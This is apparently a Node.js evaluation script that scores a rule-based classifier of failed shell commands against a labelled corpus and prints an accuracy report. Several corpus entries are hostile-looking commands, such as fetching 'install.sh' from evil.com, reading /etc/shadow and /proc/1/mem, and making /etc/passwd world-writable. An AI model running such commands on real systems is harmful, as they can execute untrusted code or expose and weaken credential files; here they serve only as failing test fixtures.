#!/usr/bin/env node
/**
 * B3 — Coroner report card.
 *
 * Runs the deterministic Coroner (fallback engine) over a corpus of real
 * failed commands with expected cause categories, prints an accuracy table,
 * and lists every miss honestly.
 *
 * Usage: node scripts/eval-coroner.mjs
 */

import { findPriorDeath } from "../dist/store.js";

/* ── deterministic Coroner logic (same as store/summon fallback) ── */

function deterministicCoroner(c) {
  const tail = (c.stderrTail ?? "").toLowerCase();
  let cause = "cause of death: unknown — the body offers no confession.";
  if (tail.includes("not found")) cause = "cause of death: the invoked spirit does not exist on this PATH.";
  else if (tail.includes("command not found") || tail.includes("no such file or directory"))
    cause = "cause of death: the invoked spirit does not exist on this PATH.";
  else if (tail.includes("unrecognized option") || tail.includes("unknown option") || tail.includes("invalid option"))
    cause = "cause of death: handed a flag this spirit never learned (check --help).";
  else if (tail.includes("permission denied")) cause = "cause of death: the gatekeeper refused (permissions).";
  else if (tail.includes("econnrefused")) cause = "cause of death: nothing was listening where it knocked (connection refused).";
  else if (tail.includes("enoent")) cause = "cause of death: a path was named that has no body (ENOENT).";
  else if (tail.includes("port is already allocated") || tail.includes("address already in use"))
    cause = "cause of death: the port is haunted by a previous tenant.";
  else if (c.exit === 137 || tail.includes("killed")) cause = "cause of death: slain by the reaper of RAM (SIGKILL / OOM).";
  const prior = findPriorDeath(String(c.cmd ?? ""));
  const cure = prior?.cure ? `treatment that worked before: ${prior.cure}` : undefined;
  return { cause, cure };
}

/* ── cause category labels (what the Coroner is judged on) ── */

const CASES = [
  { cmd: "gti status", exit: 127, stderrTail: "gti: command not found", expected: "command_not_found" },
  { cmd: "git statuss", exit: 1, stderrTail: "git: 'statuss' is not a git command. See 'git --help'.", expected: "command_not_found" },
  { cmd: "ls --not-a-flag", exit: 1, stderrTail: "ls: unrecognized option '--not-a-flag'", expected: "bad_flag" },
  { cmd: "tar -xzf archive.tar.gz --bogus", exit: 1, stderrTail: "tar: Unrecognized option '--bogus'", expected: "bad_flag" },
  { cmd: "cat /etc/shadow", exit: 1, stderrTail: "cat: /etc/shadow: Permission denied", expected: "permission_denied" },
  { cmd: "sudo chmod 777 /etc/passwd", exit: 1, stderrTail: "chmod: changing permissions of '/etc/passwd': Permission denied", expected: "permission_denied" },
  { cmd: "curl http://127.0.0.1:9999/api", exit: 7, stderrTail: "curl: (7) Failed to connect to 127.0.0.1 port 9999: Connection refused", expected: "connection_refused" },
  { cmd: "node app.js", exit: 1, stderrTail: "node: internal/modules/cjs/loader: ENOENT: no such file or directory", expected: "enoent" },
  { cmd: "docker ps", exit: 1, stderrTail: "docker: error connecting to Docker daemon", expected: "connection_refused" },
  { cmd: "sleep 999999", exit: 137, stderrTail: "Killed", expected: "oom" },
  { cmd: "npm start", exit: 137, stderrTail: "<--- Last few GCs ---\n<--- JS stacktrace ---\nFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory", expected: "oom" },
  { cmd: "cat nonexistent.txt", exit: 1, stderrTail: "cat: nonexistent.txt: No such file or directory", expected: "enoent" },
  { cmd: "ssh user@badhost", exit: 255, stderrTail: "ssh: Could not resolve hostname badhost: Name or service not known", expected: "connection_refused" },
  { cmd: "git push --force origin main", exit: 1, stderrTail: "remote: error: deny updating checked out branch", expected: "permission_denied" },
  { cmd: "rm important_file.txt", exit: 1, stderrTail: "rm: cannot remove 'important_file.txt': Permission denied", expected: "permission_denied" },
  { cmd: "python script.py", exit: 127, stderrTail: "python: command not found", expected: "command_not_found" },
  { cmd: "ls /dev/nonexistent", exit: 1, stderrTail: "ls: cannot access '/dev/nonexistent': No such file or directory", expected: "enoent" },
  { cmd: "redis-cli ping", exit: 1, stderrTail: "Could not connect to Redis at 127.0.0.1:6379: Connection refused", expected: "connection_refused" },
  { cmd: "kubectl get pods", exit: 1, stderrTail: "The connection to the server localhost:8080 was refused - did you specify the right host or port?", expected: "connection_refused" },
  { cmd: "npm run dev", exit: 137, stderrTail: "Process exited with code 137", expected: "oom" },
  { cmd: "git checkout --detached", exit: 1, stderrTail: "error: invalid option --detached", expected: "bad_flag" },
  { cmd: "ps aux | grep zombie", exit: 1, stderrTail: "zombie: command not found", expected: "command_not_found" },
  { cmd: "cat /proc/1/mem", exit: 1, stderrTail: "cat: /proc/1/mem: Permission denied", expected: "permission_denied" },
  { cmd: "wget https://evil.com/install.sh", exit: 1, stderrTail: "wget: unable to resolve host address 'evil.com'", expected: "connection_refused" },
  { cmd: "tail -f /var/log/syslog", exit: 1, stderrTail: "tail: cannot open '/var/log/syslog' for reading: Permission denied", expected: "permission_denied" },
  { cmd: "node -e \"require('nonexistent')\"", exit: 1, stderrTail: "Cannot find module 'nonexistent'", expected: "enoent" },
  { cmd: "git commit -m \"wip\"", exit: 1, stderrTail: "nothing to commit, working tree clean", expected: "unknown" },
  { cmd: "some-weird-command", exit: 127, stderrTail: "some-weird-command: command not found", expected: "command_not_found" },
  { cmd: "ls --help --bad", exit: 1, stderrTail: "ls: unrecognized option '--bad'", expected: "bad_flag" },
];

/* ── run eval ── */

function categoryFor(cause) {
  if (/does not exist on this PATH/.test(cause)) return "command_not_found";
  if (/never learned/.test(cause)) return "bad_flag";
  if (/gatekeeper refused/.test(cause)) return "permission_denied";
  if (/listening where it knocked/.test(cause)) return "connection_refused";
  if (/no body \(ENOENT\)/.test(cause)) return "enoent";
  if (/reaper of RAM/.test(cause)) return "oom";
  return "unknown";
}

const results = [];
for (const c of CASES) {
  const verdict = deterministicCoroner(c);
  const got = categoryFor(verdict.cause);
  results.push({ cmd: c.cmd, expected: c.expected, got, ok: got === c.expected, cause: verdict.cause });
}

const total = results.length;
const passed = results.filter((r) => r.ok).length;
const failed = total - passed;
const accuracy = ((passed / total) * 100).toFixed(1);

/* ── expected-cause breakdown ── */

const expectedCounts = {};
for (const c of CASES) {
  if (!expectedCounts[c.expected]) expectedCounts[c.expected] = { total: 0, correct: 0 };
  expectedCounts[c.expected].total++;
}
for (const r of results) {
  if (r.ok) expectedCounts[r.expected].correct++;
}

console.log("╔════════════════════════════════════════════════════════════════════════════════╗");
console.log("║                        CORONER REPORT CARD (B3)                              ║");
console.log("║  deterministic Coroner accuracy over a real failure corpus                    ║");
console.log("╚════════════════════════════════════════════════════════════════════════════════╝");
console.log("");
console.log(`  Total cases: ${total}`);
console.log(`  Correct:     ${passed}`);
console.log(`  Misses:      ${failed}`);
console.log(`  Accuracy:    ${accuracy}%`);
console.log("");

console.log("  Per-cause accuracy:");
for (const [cat, counts] of Object.entries(expectedCounts)) {
  const pct = ((counts.correct / counts.total) * 100).toFixed(1);
  const bar = "█".repeat(counts.correct) + "░".repeat(counts.total - counts.correct);
  console.log(`    ${cat.padEnd(20)} ${counts.correct}/${counts.total}  ${pct.padStart(5)}%  [${bar}]`);
}
console.log("");

const misses = results.filter((r) => !r.ok);
if (misses.length > 0) {
  console.log("  Honest misses:");
  for (const m of misses) {
    console.log(`    "${m.cmd}"`);
    console.log(`      expected: ${m.expected}  |  got: ${m.got}`);
    console.log(`      cause: ${m.cause}`);
    console.log("");
  }
} else {
  console.log("  Honest misses: none — perfect score on this corpus.");
}
console.log("");

console.log("  Caveats: deterministic pattern matching, no model. With Ollama/Gemma awake,");
console.log("  the model voice can override for nuance — but this table is the floor.");
console.log("╔════════════════════════════════════════════════════════════════════════════════╗");
